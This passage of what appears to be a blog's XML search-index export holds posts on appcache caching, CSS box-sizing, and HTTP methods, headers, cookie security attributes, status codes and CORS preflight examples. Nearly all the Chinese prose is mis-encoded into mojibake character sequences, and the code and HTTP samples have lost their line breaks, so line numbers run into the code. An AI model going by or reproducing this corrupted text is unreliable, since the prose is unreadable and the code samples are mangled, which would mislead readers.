ç­”ï¼šæµè§ˆå™¨ä¼šæ ¹æ® manifest æè¿°çš„ç¼“å­˜åˆ—è¡¨å…¨éƒ¨é‡æ–°æ‹‰å–ï¼Œå­˜å…¥ä¸´æ—¶ç¼“å­˜ï¼Œç”¨æˆ·å†æ¬¡è¿›å…¥å†æ¨å…¥ç¼“å­˜ æ›´æ–° manifest ç¼“å­˜æ—¶ï¼Œå¦‚ä½•å¤„ç†å·²ç»æ··å­˜çš„æ–‡ä»¶ï¼Ÿ ç­”ï¼šæµè§ˆå™¨ä¼šå‰”é™¤ã€ä¸å¿…è¦ã€‘çš„ç¼“å­˜æ–‡ä»¶ï¼Œä¾‹å¦‚è¿‡æœŸçš„ js æ–‡ä»¶ç­‰ï¼Œä½†åªæ˜¯ get å‚æ•°ä¸åŒä¼šä¸€ç›´ç¼“å­˜ç€ï¼Œä¸ä¼šè¢«æ¸…é™¤ æ²¡æœ‰è¢« manifest å£°æ˜çš„æ–‡ä»¶ä¸ä¼šåŠ è½½? ç­”ï¼šNETWORK section åŠ ä¸Šé€šé…ç¬¦ * æ·»åŠ  manifest download ç›¸å…³çš„æ›´æ–°äº‹ä»¶ç›‘å¬è„šæœ¬ï¼Œéœ€è¦ä¸¤æ¬¡æ›´æ–° manifest æ‰èƒ½ç”Ÿæ•ˆ(é¦–æ¬¡ç¼“å­˜ç¬¬ä¸€æ¬¡å°±ä¼šç”Ÿæ•ˆ) ç­”ï¼šç¬¬ä¸€æ¬¡æ›´æ–°è„šæœ¬ï¼Œç¬¬äºŒæ¬¡æ›´æ–° manifest æ–‡ä»¶åæ‰ä¼šè§¦å‘è„šæœ¬ç›‘å¬çš„äº‹ä»¶ é¦–æ¬¡è¿›å…¥å«æœ‰ appcache çš„ html ä¸»é¡µé¢ï¼Œprogress æ˜¾ç¤ºçš„ç¼“å­˜æ–‡ä»¶æ•°ä¼šæ¯”å®é™…æƒ…å†µå°‘ 1ï¼Ÿç­”ï¼šé¦–æ¬¡è¿›å…¥é¡µé¢ï¼Œä¸» html çš„ç¼“å­˜ä¸ä¼šè®¡å…¥ progress ç›‘æ§å…³æ³¨ç‚¹ ç™½å±æ—¶é—´çš„æ”¹å–„æƒ…å†µï¼Ÿ äº§å“æ›´æ–°ä¸Šçº¿åï¼Œæ‰€æœ‰è®¿é—®ç”¨æˆ·æ–°ç‰ˆæœ¬ä½¿ç”¨æƒ…å†µï¼Ÿç¬¬ä¸€æ¬¡è®¿é—®ç”¨æˆ·ï¼Ÿç¬¬ &gt;= 2 æ¬¡è®¿é—®çš„ç”¨æˆ·ï¼Ÿ ç¼“å­˜å¤±è´¥ç‡ï¼ˆsw, appcache) ä¼šä¸ä¼šæœ‰æ°¸è¿œä¸æ›´æ–°çš„ç”¨æˆ·ï¼Ÿ ç»Ÿè®¡ sw å’Œ appcache å æ¯”ï¼Ÿ]]></content>
      <categories>
        <category>ç¦»çº¿ç¼“å­˜</category>
      </categories>
      <tags>
        <tag>appcache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[box-sizing]]></title>
    <url>%2Fbox-sizing%2F</url>
    <content type="text"><![CDATA[æƒ³å¿…å¤§å¤šæ•°äººéƒ½ç”¨è¿‡ box-sizing å±æ€§å§ï¼Ÿé‚£ä¹ˆè¿™ä¸ªå±æ€§çš„å€¼å¯¹åº”çš„ css ç›’å­æ¨¡å‹å®½é«˜è®¡ç®—æ–¹å¼æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ css ç›’å­æ¨¡å‹ é¦–å…ˆæˆ‘ä»¬æ¥çœ‹çœ‹ css ç›’å­æ¨¡å‹å®½åº¦å’Œé«˜åº¦çš„è®¡ç®—ï¼š å®½åº¦ = border(left&amp;&amp;right) + padding(left&amp;&amp;right) + contentWidth(æˆ–è€…æ‰‹åŠ¨è®¾ç½®çš„å…ƒç´ å®½åº¦) é«˜åº¦ = border(top&amp;&amp;bottom) + padding(top&amp;&amp;bottom) + contentHeight(æˆ–è€…æ‰‹åŠ¨è®¾ç½®çš„å…ƒç´ é«˜åº¦) è¿™çœ‹èµ·æ¥å¯èƒ½ä¼šæœ‰äº›æŠ½è±¡ï¼Œæˆ‘ä»¬é€šè¿‡å›¾ç‰‡æ¥ç®€å•è®²è§£ä¸€ä¸‹ï¼š å¦‚å›¾æ‰€ç¤ºï¼Œç›’å­çš„å®½åº¦ = 40(px) 2 + 2(px) 2 + 236(px) = 320px; ç›’å­é«˜åº¦è®¡ç®—æ–¹å¼ç±»ä¼¼ã€‚ box-sizing ç”¨äºæ”¹å˜ css ç›’å­æ¨¡å‹è®¡ç®—å®½é«˜çš„æ–¹å¼ï¼Œæœ‰ä¸¤ä¸ªå€¼ï¼Œä¸€ä¸ª content-box(é»˜è®¤å€¼)ï¼Œå¦ä¸€ä¸ª border-boxã€‚ä¸‹é¢æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹è¿™ä¸¤ä¸ªå€¼ã€‚ content-boxcontent-box æ˜¯é»˜è®¤å€¼ã€‚å®ƒæ˜¯å¦‚ä½•è®¡ç®—å…ƒç´ çš„å®½é«˜çš„å‘¢ï¼Ÿå¦‚ä¸‹å›¾æ‰€ç¤ºé¦–å…ˆæˆ‘ä»¬è®¾ç½® box çš„å®½é«˜ä¸º 100pxï¼Œè¾¹å®½ 2pxï¼Œå†…è¾¹è·ï¼ˆpadding) 10pxï¼š ç„¶å WTFï¼Œbox å®½åº¦å˜ä¸º 124 px äº†? æ˜æ˜æˆ‘æ˜¯æƒ³è®¾ç½®å®½åº¦ä¸º 100px çš„å‘€ï¼Ÿè¿™ç§æƒ…å†µæ˜¯ä¸æ˜¯æœ‰ç‚¹ä¼¼æ›¾ç›¸è¯†çš„æ„Ÿè§‰ã€æ»‘ç¨½ã€‘æ³¨æ„: content-box ä¸ºé»˜è®¤å€¼æ‰€ä»¥ä¸ç”¨å†™ box-sizing: content-box; ä¹Ÿè¡Œï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨åŠ ä¸Šã€‚ å…¶å®å½“ box-sizing ä¸º content-box çš„æ—¶å€™ï¼Œå¦‚æœä½ è®¾ç½®å…ƒç´ å®½åº¦ï¼ˆwidthï¼‰æˆ–é«˜åº¦ï¼ˆheightï¼‰ï¼Œå®é™…ä¸Šè®¾ç½®çš„æ˜¯ content çš„å®½é«˜ï¼ˆæ ‡é¢˜å›¾çš„contentï¼‰å¹¶ä¸æ˜¯ç›’å­çš„å®½é«˜ã€‚ä¹Ÿå°±æ˜¯è¯´å®é™…å®½åº¦ä¸ºï¼š å®½åº¦ = border + padding + width(ä½ æ‰‹åŠ¨è®¾ç½®çš„å®½åº¦) border-boxå¦‚æœæˆ‘ä»¬ç»™ box è®¾ç½® box-sizing: border-box ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿå¦‚ä¸‹å›¾ï¼š æˆ‘ä»¬å¯ä»¥çœ‹åˆ° box çš„å®½é«˜å˜å› 100px * 100px äº†ï¼Œå¥½ç¥å¥‡å‘€ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„ç­”æ¡ˆã€‚ å¦‚æœæˆ‘ä»¬ç»™å…ƒç´ è®¾ç½® box-sizing: border-box; é‚£ä¹ˆè¯¥å…ƒç´ çš„å®½é«˜è®¡ç®—æ–¹å¼ä¸ºï¼ˆä»¥å®½ä¸¾ä¾‹ï¼‰ï¼š å®½åº¦ = width(ä½ æ‰‹åŠ¨è®¾ç½®çš„å®½åº¦) width(ä½ æ‰‹åŠ¨è®¾ç½®çš„å®½åº¦) = border + padding + content; æ—¢ç„¶è®¾ç½®ä¸º border-box æ˜¯æˆ‘ä»¬æ›´æœŸæœ›çš„æ¸²æŸ“è¡Œä¸ºï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦åº”è¯¥è®¾ç½®å…¨éƒ¨å…ƒç´ ä¸º border-box å‘¢ï¼Ÿ 123* &#123; box-sizing: border-box;&#125; ç­”æ¡ˆæ˜¯å¦ï¼Œå› ä¸ºå¤§éƒ¨åˆ†å…ƒç´ ä½ ä¸éœ€è¦æ‰‹åŠ¨è®¾ç½®å®½é«˜ï¼Œåœ¨éœ€è¦æ‰‹åŠ¨è®¾ç½®å®½é«˜çš„å…ƒç´ ä¸Šå†ä½¿ç”¨æ˜¯ä¸€ç§æ›´å¥½çš„é€‰æ‹©ã€‚å½“ç„¶ä½ è¦è¿™ä¹ˆä½¿ç”¨ä¹Ÿæ²¡ä»€ä¹ˆé—®é¢˜ï½]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>box-sizing</tag>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[èŠä¸€èŠ HTTP]]></title>
    <url>%2Fhttp%2F</url>
    <content type="text"><![CDATA[ä¸‹æ–‡ä¸­çš„CORSå†…å®¹å¤§éƒ¨åˆ†æ‘˜è‡ª HTTPè®¿é—®æ§åˆ¶ï¼ˆCORSï¼‰ï¼Œè¿™é‡Œè¿›è¡Œäº†éƒ¨åˆ†æ›´æ”¹ HTTP ç®€ä»‹HTTP è¶…æ–‡æœ¬ä¼ è¾“åè®®(Hypertext Transper Protocol)ï¼Œåº”ç”¨å±‚åè®®ã€‚åŸºäºä¸€ç§è¯·æ±‚/å“åº”çš„å·¥ä½œæ¨¡å¼ã€‚å³å½“å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨è¿æ¥åï¼Œå®¢æˆ·ç«¯å‘é€è¯·æ±‚ï¼ŒæœåŠ¡å™¨ç»™å‡ºå“åº”ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬ä»å¸¸ç”¨è¯·æ±‚æ–¹æ³•ã€HTTP Headersã€å“åº”çŠ¶æ€ç ã€è·¨èµ„æºå…±äº« 4 ä¸ªæ–¹é¢è¿›è¡Œåˆ†æã€‚ å¸¸ç”¨è¯·æ±‚æ–¹æ³•è™½ç„¶ HTTP è§„èŒƒå®šä¹‰ä¸€ç³»åˆ—æ–¹æ³•ï¼Œä½†æ˜¯å¸¸ç”¨çš„æ— é GETã€POSTã€HEADã€CONNECTï¼› GET GET æ–¹æ³•è¯·æ±‚ä¸€ä¸ªæŒ‡å®šèµ„æºçš„è¡¨ç¤ºæ–¹å¼ã€‚ä½¿ç”¨ GET æ–¹æ³•åº”è¯¥åªç”¨äºè·å–æ•°æ® POST POST æ–¹æ³•ç”¨äºå°†å®ä½“æäº¤ç»™æŒ‡å®šçš„èµ„æºï¼Œé€šå¸¸å¯¼è‡´çŠ¶æ€æˆ–æœåŠ¡å™¨ä¸Šçš„å‰¯ä½œç”¨çš„æ›´æ”¹ HEAD HEAD æ–¹æ³•è¯·æ±‚ä¸€ä¸ªä¸ GET è¯·æ±‚çš„å“åº”ç›¸åŒçš„ç›¸åº”ï¼Œä½†æ²¡æœ‰å“åº”ä½“ã€‚æ­¤æ–¹æ³•ç»å¸¸ç”¨äºæµ‹è¯•è¶…æ–‡æœ¬è¿æ¥çš„æœ‰æ•ˆæ€§ã€å¯è®¿é—®æ€§ã€å’Œæœ€è¿‘çš„æ”¹å˜ CONNECT CONNECT æ–¹æ³•å»ºç«‹ä¸€ä¸ªåˆ°ç”±ç›®æ ‡èµ„æºæ ‡è¯†çš„æœåŠ¡å™¨çš„éš§é“ HTTP HeadersHTTP è§„èŒƒä¹Ÿå®šä¹‰äº†ä¸€ç³»åˆ— Headers ä¿¡æ¯ï¼Œä½†æ˜¯å¤§éƒ¨åˆ†ä¸éœ€è¦æˆ‘ä»¬å¼€å‘äººå‘˜å…³å¿ƒï¼Œæµè§ˆå™¨å·²ç»å¸®æˆ‘ä»¬å®ç°å¥½äº†ã€‚æˆ‘ä»¬æ¥çœ‹çœ‹å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„ Headers ä¿¡æ¯ã€‚ Content-Typeåœ¨å“åº”ä¸­ï¼ŒContent-Typeæ ‡å¤´å‘Šè¯‰å®¢æˆ·ç«¯å®é™…è¿”å›çš„å†…å®¹çš„å†…å®¹ç±»å‹ï¼Œå¦‚ï¼š Content-Type: text/html; charset=utf-8 Content-Type: multipart/form-data; boundary=something å¸¸è§ç±»å‹æœ‰ï¼š text/html text/plain text/css text/javascript application/x-www-form-urlencoded multipart/form-data application/json application/xml æŒ‡ä»¤ï¼š media-type èµ„æºæˆ–æ•°æ®çš„ MIME type ã€‚ charset å­—ç¬¦ç¼–ç æ ‡å‡†ã€‚ boundary å¯¹äºå¤šéƒ¨åˆ†å®ä½“ï¼Œboundary æ˜¯å¿…éœ€çš„ï¼Œå…¶åŒ…æ‹¬æ¥è‡ªä¸€ç»„å­—ç¬¦çš„1åˆ°70ä¸ªå­—ç¬¦ï¼Œå·²çŸ¥é€šè¿‡ç”µå­é‚®ä»¶ç½‘å…³æ˜¯éå¸¸å¥å£®çš„ï¼Œè€Œä¸æ˜¯ä»¥ç©ºç™½ç»“å°¾ã€‚å®ƒç”¨äºå°è£…æ¶ˆæ¯çš„å¤šä¸ªéƒ¨åˆ†çš„è¾¹ç•Œã€‚ CookieHTTP Cookieï¼ˆä¹Ÿå«Web Cookieæˆ–æµè§ˆå™¨Cookieï¼‰æ˜¯æœåŠ¡å™¨å‘é€åˆ°ç”¨æˆ·æµè§ˆå™¨å¹¶ä¿å­˜åœ¨æœ¬åœ°çš„ä¸€å°å—æ•°æ®ï¼Œå®ƒä¼šåœ¨æµè§ˆå™¨ä¸‹æ¬¡å‘åŒä¸€æœåŠ¡å™¨å†å‘èµ·è¯·æ±‚æ—¶è¢«æºå¸¦å¹¶å‘é€åˆ°æœåŠ¡å™¨ä¸Šã€‚ Cookie ä¸»è¦ç”¨äºä»¥ä¸‹ä¸‰ä¸ªæ–¹é¢ï¼š ä¼šè¯çŠ¶æ€ç®¡ç†ï¼ˆå¦‚ç”¨æˆ·ç™»å½•çŠ¶æ€ã€è´­ç‰©è½¦ã€æ¸¸æˆåˆ†æ•°æˆ–å…¶ä»–éœ€è¦è®°å½•çš„ä¿¡æ¯ï¼‰ ä¸ªæ€§åŒ–è®¾ç½®ï¼ˆå¦‚ç”¨æˆ·è‡ªå®šä¹‰è®¾ç½®ã€ä¸»é¢˜ç­‰ï¼‰ æµè§ˆå™¨è¡Œä¸ºè·Ÿè¸ªï¼ˆå¦‚åˆ†æç”¨æˆ·è¡Œä¸ºç­‰ï¼‰ cookie å®‰å…¨ç›¸å…³å„ä¸ªå±æ€§| å±æ€§ | ç»“æœ || :â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“ | :â€“: || value | å¦‚æœä¿å­˜ç”¨æˆ·ç™»å½•æ€ï¼Œåº”è¯¥å°†è¯¥å€¼åŠ å¯†ï¼Œä¸èƒ½ä½¿ç”¨æ˜æ–‡çš„ç”¨æˆ·æ ‡è¯† || http-only | ä¸èƒ½é€šè¿‡ js è®¿é—® cookieï¼Œå‡å°‘ XSS æ”»å‡»|| secure | åªèƒ½åœ¨åè®®ä¸º https çš„è¯·æ±‚ä¸­æºå¸¦ || same-site | åˆ¶å®šæµè§ˆå™¨ä¸èƒ½å†è·¨åŸŸçš„è¯·æ±‚ä¸­æºå¸¦ cookie, å‡å°‘ CSRF æ”»å‡» | è·¨èµ„æºè¯·æ±‚ç›¸å…³ HeaderAccess-Control-Allow-Origin ç­‰ä¿¡æ¯ï¼Œå…·ä½“çœ‹ä¸‹æ–‡[è·¨èµ„æºå…±äº«æ¨¡å—] å“åº”çŠ¶æ€ç çŠ¶æ€ç åˆ†ä¸º5å¤§ç±»ï¼š 1XXï¼ˆä¿¡æ¯æè¿°ï¼‰ï¼šæ¥å—çš„è¯·æ±‚æ­£åœ¨å¤„ç† 2XXï¼ˆæˆåŠŸçŠ¶æ€ï¼‰ï¼šè¯·æ±‚æ­£å¸¸å¤„ç†å®Œæ¯•ã€‚å…¶ä¸­ 206 è¡¨ç¤ºè¯·æ±‚éƒ¨åˆ†å†…å®¹æˆåŠŸ 3XXï¼ˆé‡å®šå‘çŠ¶æ€ï¼‰ï¼šæœåŠ¡å™¨è¦æ±‚å®¢æˆ·ç«¯é‡å®šå‘ 4XX ï¼ˆå®¢æˆ·ç«¯é”™è¯¯ï¼‰ï¼šæœåŠ¡å™¨æ— æ³•å¤„ç†è¯·æ±‚ 5XX ï¼ˆæœåŠ¡å™¨é”™è¯¯ï¼‰ï¼šæœåŠ¡å™¨å¤„ç†è¯·æ±‚å‡ºé”™ å¸¸ç”¨çŠ¶æ€ç  200: å®¢æˆ·ç«¯è¯·æ±‚æˆåŠŸ 301: èµ„æºæ°¸ä¹…é‡å®šå‘ 302: èµ„æºæš‚æ—¶é‡å®šå‘ 304: è¯·æ±‚èµ„æºæœªæ”¹åŠ¨ï¼ˆä¸ä¼šè¿”å›ä»»ä½•èµ„æºï¼Œå®¢æˆ·ç«¯åˆ©ç”¨æœ¬åœ°ç¼“å­˜èµ„æºï¼‰ 400: å®¢æˆ·ç«¯è¯·æ±‚å‚æ•°é”™è¯¯ 401: è¯·æ±‚æœªæˆæƒ 403: æœåŠ¡å™¨æ‹’ç»æ¥å—æœåŠ¡ 404ï¼šè¯·æ±‚èµ„æºä¸å­˜åœ¨ 500: æœåŠ¡å™¨å‘ç”Ÿä¸å¯é¢„æœŸé”™è¯¯ 503: æœåŠ¡å™¨å½“å‰ä¸èƒ½å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ è·¨èµ„æºè®¿é—®ï¼ˆCORSï¼‰å½“ä¸€ä¸ªèµ„æºä»ä¸è¯¥èµ„æºæœ¬èº«æ‰€åœ¨çš„æœåŠ¡å™¨ä¸åŒåŸŸæˆ–ç«¯å£è¯·æ±‚ä¸€ä¸ªèµ„æºæ—¶ï¼Œèµ„æºä¼šå‘èµ·ä¸€ä¸ªè·¨åŸŸ HTTP è¯·æ±‚ã€‚è·¨åŸŸèµ„æºå…±äº«æ ‡å‡†æ–°å¢äº†ä¸€ç»„ HTTP é¦–éƒ¨å­—æ®µï¼Œå…è®¸æœåŠ¡å™¨å£°æ˜å“ªäº›æºç«™æœ‰æƒè®¿é—®å“ªäº›èµ„æºã€‚ ä¸ºäº†é˜²æ­¢ CSRF è·¨ç«™æ”»å‡»ï¼Œæµè§ˆå™¨å¯¹è·¨åŸŸè¯·æ±‚åšäº†é™åˆ¶ï¼Œå³è·¨èµ„æºå…±äº«ï¼ˆCORSï¼‰æœºåˆ¶ï¼Œå…·ä½“å¦‚ä¸‹ï¼š ç®€å•è¯·æ±‚ï¼ˆä¸ä¼šå¼•èµ·å…¶ä»–å‰¯ä½œç”¨çš„è¯·æ±‚ï¼‰ï¼Œç›´æ¥å‘èµ·è¯·æ±‚ï¼Œå¦‚æœæœåŠ¡å™¨æ‹’ç»è·¨åŸŸï¼Œæµè§ˆå™¨ä¼šå¯¹è¯·æ±‚ç»“æœè¿›è¡Œæ‹¦æˆªï¼Œå¦åˆ™é€šè¿‡è¯·æ±‚ã€‚ å¯¹äºå¯èƒ½å¯¹æœåŠ¡å™¨äº§ç”Ÿå‰¯ä½œç”¨çš„ HTTP è¯·æ±‚æ–¹æ³•ï¼Œæµè§ˆå™¨å¿…é¡»é¦–å…ˆä½¿ç”¨ OPTIONS æ–¹æ³•å‘èµ·ä¸€ä¸ªé¢„æµ‹è¯·æ±‚ï¼Œä»è€Œè·çŸ¥æœåŠ¡ç«¯æ˜¯å¦å…è®¸è·¨åŸŸè¯·æ±‚ï¼ŒæœåŠ¡å™¨ç¡®è®¤å…è®¸ä¹‹åï¼Œæ‰å‘èµ·å®é™…çš„HTTP è¯·æ±‚ã€‚åœ¨é¢„æµ‹è¯·æ±‚çš„è¿”å›ä¸­ï¼ŒæœåŠ¡ç«¯ä¹Ÿå¯ä»¥é€šçŸ¥å®¢æˆ·ç«¯ï¼Œæ˜¯å¦éœ€è¦æºå¸¦èº«ä»½å‡­è¯ã€‚ æœ‰äº›æµè§ˆå™¨ä¸å…è®¸ä» HTTPS çš„åŸŸè·¨åŸŸè®¿é—® HTTPï¼Œæ¯”å¦‚ Chrome å’Œ Firefoxï¼Œè¿™äº›è¯·æ±‚è¿˜ä¸ºå‘èµ·å°±è¢«æ‹¦æˆªã€‚ ä¸€ä¸ªæºçš„å®šä¹‰å¦‚æœåè®®ã€ç«¯å£å’ŒåŸŸåå¯¹äºå½“å‰è®¿é—®é¡µé¢æ˜¯ç›¸åŒçš„ï¼Œåˆ™ä¸¤ä¸ªé¡µé¢åŒæºã€‚ ä¾‹å¦‚å½“å‰è®¿é—®é¡µé¢ä¸ºï¼šhttp://www.example.com/test URL ç»“æœ åŸå›  http://www.example.com/test1 æˆåŠŸ https://www.example.com/test1 å¤±è´¥ åè®®ä¸åŒ http://www.example.com:81/test å¤±è´¥ ç«¯å£ä¸åŒ http://news.example.com/test å¤±è´¥ ä¸åŒåŸŸå IEä¾‹å¤– æˆä¿¡èŒƒå›´ï¼šä¸¤ä¸ªç›¸äº’ä¹‹é—´é«˜åº¦äº’ä¿¡çš„åŸŸåï¼Œå¦‚å…¬å¸åŸŸåï¼Œä¸éµå®ˆåŒæºç­–ç•¥çš„é™åˆ¶ã€‚ ç«¯å£ï¼šIE æœªå°†ç«¯å£å·åŠ å…¥åˆ°åŒæºç­–ç•¥çš„ç»„æˆæˆåˆ†ä¹‹ä¸­ã€‚ ç®€å•è¯·æ±‚æ»¡è¶³ä¸‹åˆ—æ¡ä»¶çš„è¯·æ±‚ï¼Œå¯è¢«è§†ä¸ºâ€œç®€å•è¯·æ±‚â€ï¼š ä¸‹åˆ—æ–¹æ³•ä¹‹ä¸€ GET HEAD POST Fetch è§„èŒƒå®šä¹‰å¯¹ CORS å®‰å…¨çš„é¦–éƒ¨å­—æ®µé›†åˆï¼Œä¸å¾—äººä¸ºè®¾ç½®è¯¥é›†åˆä¹‹å¤–çš„å…¶ä»–é¦–éƒ¨å­—æ®µï¼Œè¯¥é›†åˆä¸ºï¼š Accept Accept-Language Content-Language Content-Type(æœ‰é¢å¤–é™åˆ¶ï¼Œå‚è§ä¸‹æ–‡) DPR Downlink Save-Data Viewport-Width Width Content-Type çš„å€¼ä»…é™äºä¸‹åˆ—ä¸‰è€…ä¹‹ä¸€ï¼š text/plain multipart/form-data application/x-www-form-urlencoded åˆ—å¦‚ä¸‹é¢è¿™ä¸ªè¯·æ±‚ï¼Œç«™ç‚¹http://bar.other è®¿é—®ç«™ç‚¹ http://foo.example èµ„æºï¼š 1234567891011121314151617181920GET /resources/public-data/ HTTP/1.1Host: bar.otherUser-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3preAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip,deflateAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7Connection: keep-aliveReferer: http://foo.example/examples/access-control/simpleXSInvocation.htmlOrigin: http://foo.exampleHTTP/1.1 200 OKDate: Mon, 01 Dec 2008 00:23:53 GMTServer: Apache/2.0.61 Access-Control-Allow-Origin: *Keep-Alive: timeout=2, max=100Connection: Keep-AliveTransfer-Encoding: chunkedContent-Type: application/xml è¿™é‡Œæœ‰ä¸¤ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„é¦–éƒ¨å­—æ®µï¼š Origin: åœ¨ç¬¬ 10 è¡Œï¼Œè¡¨æ˜è¯¥è¯·æ±‚æ¥æºäº http://foo.example Access-Control-Allow-Origin: åœ¨ç¬¬16è¡Œï¼Œå€¼ä¸ºï¼š*ï¼Œè¡¨æ˜è¯¥èµ„æºå¯ä»¥è¢«ä»»æ„çš„åŸŸè®¿é—®ï¼Œå¦‚æœæœåŠ¡ç«¯ä»…å…è®¸æ¥è‡ª http://foo.example çš„è®¿é—®ï¼Œé¦–éƒ¨å­—æ®µåº”è¯¥å¦‚ä¸‹ï¼š 1Access-Control-Allow-Origin: http://foo.example éœ€è¦æ£€æµ‹çš„è¯·æ±‚å¦‚å‰æ–‡æ‰€è¿°ï¼Œéœ€è¦æ£€æµ‹çš„è¯·æ±‚ï¼Œéœ€è¦å…ˆå‘èµ·ä¸€ä¸ª OPTIONS é¢„æ£€è¯·æ±‚åˆ°æœåŠ¡å™¨ï¼Œ æ»¡è¶³ä¸‹è¿°ä»»æ„æ¡ä»¶æ—¶ï¼Œåº”é¦–å…ˆå‘èµ·é¢„æ£€è¯·æ±‚ï¼š ä½¿ç”¨äº†ä¸‹åˆ—ä»»ä¸€æ–¹æ³• PUT DELETE CONNECT OPTIONS TRACE PATCH äººä¸ºè®¾ç½®äº† CORS å®‰å…¨çš„é¦–éƒ¨å­—æ®µé›†åˆä¹‹å¤–çš„å…¶ä»–é¦–éƒ¨å­—æ®µï¼Œè¯¥é›†åˆä¸ºï¼š Accept Accept-Language Content-Language Content-Type(æœ‰é¢å¤–é™åˆ¶ï¼Œå‚è§ä¸‹æ–‡) DPR Downlink Save-Data Viewport-Width Width Content-Type çš„å€¼ä¸å±äºä¸‹åˆ—ä¹‹ä¸€ï¼š application/x-www-form-urlencoded multipart/form-data text/plain å¦‚ä¸‹æ˜¯ä¸€ä¸ªéœ€è¦æ‰§è¡Œé¢„æ£€è¯·æ±‚çš„ HTTP è¯·æ±‚ï¼š 12345678910111213let invocation = new XMLHttpRequest();let url = 'http://bar.other/resources/post-here/';let body = '&lt;?xml version="1.0"?&gt;&lt;person&gt;&lt;name&gt;Arun&lt;/name&gt;&lt;/person&gt;'; function callOtherDomain() &#123; if (invocation) &#123; invocation.open('POST', url, true); invocation.setRequestHeader('X-PINGOTHER', 'pingpong'); invocation.setRequestHeader('Content-Type', 'application/xml'); invocation.onreadystatechange = handler; invocation.send(body); &#125;&#125; ä¸Šé¢çš„ä»£ç ä½¿ç”¨ POST è¯·å‘é€ä¸€ä¸ª XML æ–‡æ¡£ï¼ŒåŒ…å«è‡ªå®šä¹‰é¦–éƒ¨ X-PINGOTHER: pingpongã€‚å¦å¤–è¯·æ±‚çš„ Content-Type ä¸º application/xmlã€‚å› æ­¤ï¼Œè¯¥è¯·æ±‚éœ€è¦é¦–å…ˆå‘èµ·â€é¢„æ£€è¯·æ±‚â€ã€‚ 1234567891011121314151617181920212223242526OPTIONS /resources/post-here/ HTTP/1.1Host: bar.otherUser-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3preAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip,deflateAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7Connection: keep-aliveOrigin: http://foo.exampleAccess-Control-Request-Method: POSTAccess-Control-Request-Headers: X-PINGOTHER, Content-TypeHTTP/1.1 200 OKDate: Mon, 01 Dec 2008 01:15:39 GMTServer: Apache/2.0.61 (Unix)Access-Control-Allow-Origin: http://foo.exampleAccess-Control-Allow-Methods: POST, GET, OPTIONSAccess-Control-Allow-Headers: X-PINGOTHER, Content-TypeAccess-Control-Max-Age: 86400Vary: Accept-Encoding, OriginContent-Encoding: gzipContent-Length: 0Keep-Alive: timeout=2, max=100Connection: Keep-AliveContent-Type: text/plain é¢„æ£€è¯·æ±‚å®Œæˆåï¼Œå‘é€å®é™…è¯·æ±‚ï¼š 1234567891011121314151617181920212223242526272829POST /resources/post-here/ HTTP/1.1Host: bar.otherUser-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3preAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip,deflateAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7Connection: keep-aliveX-PINGOTHER: pingpongContent-Type: text/xml; charset=UTF-8Referer: http://foo.example/examples/preflightInvocation.htmlContent-Length: 55Origin: http://foo.examplePragma: no-cacheCache-Control: no-cache&lt;?xml version=&quot;1.0&quot;?&gt;&lt;person&gt;&lt;name&gt;Arun&lt;/name&gt;&lt;/person&gt;HTTP/1.1 200 OKDate: Mon, 01 Dec 2008 01:15:40 GMTServer: Apache/2.0.61 (Unix)Access-Control-Allow-Origin: http://foo.exampleVary: Accept-Encoding, OriginContent-Encoding: gzipContent-Length: 235Keep-Alive: timeout=2, max=99Connection: Keep-AliveContent-Type: text/plain ä»ä¸Šé¢çš„æŠ¥æ–‡ä¸­æˆ‘ä»¬çœ‹åˆ°ï¼Œç¬¬1-12 è¡Œå‘é€äº†ä¸€ä¸ª OPTIONS æ–¹æ³•çš„â€œé¢„æ£€è¯·æ±‚â€ã€‚OPTIONS æ˜¯ HTTP/1.1 çš„æ–¹æ³•ï¼Œç”¨ä»¥ä»æœåŠ¡å™¨è·å–æ›´å¤šçš„ä¿¡æ¯ï¼Œè¯¥æ–¹æ³•ä¸ä¼šå¯¹æœåŠ¡å™¨èµ„æºäº§ç”Ÿå½±å“ã€‚é¢„æ£€è¯·æ±‚æºå¸¦äº†ä¸‹é¢è¿ä¸ªé¦–éƒ¨å­—æ®µï¼š 12Access-Control-Request-Method: POSTAccess-Control-Request-Headers: X-PINGOTHER Access-Control-Request-Method å‘ŠçŸ¥æœåŠ¡å™¨ï¼Œå®é™…ä½¿ç”¨çš„è¯·æ±‚æ–¹æ³•ï¼Œåœ¨è¿™é‡Œæ˜¯ POSTã€‚ Access-Control-Request-Headers å‘ŠçŸ¥æœåŠ¡å™¨ï¼Œå®é™…è¯·æ±‚æºå¸¦çš„è‡ªå®šä¹‰é¦–éƒ¨å­—æ®µï¼Œåœ¨è¿™é‡Œæ˜¯ X-PINGOTHER 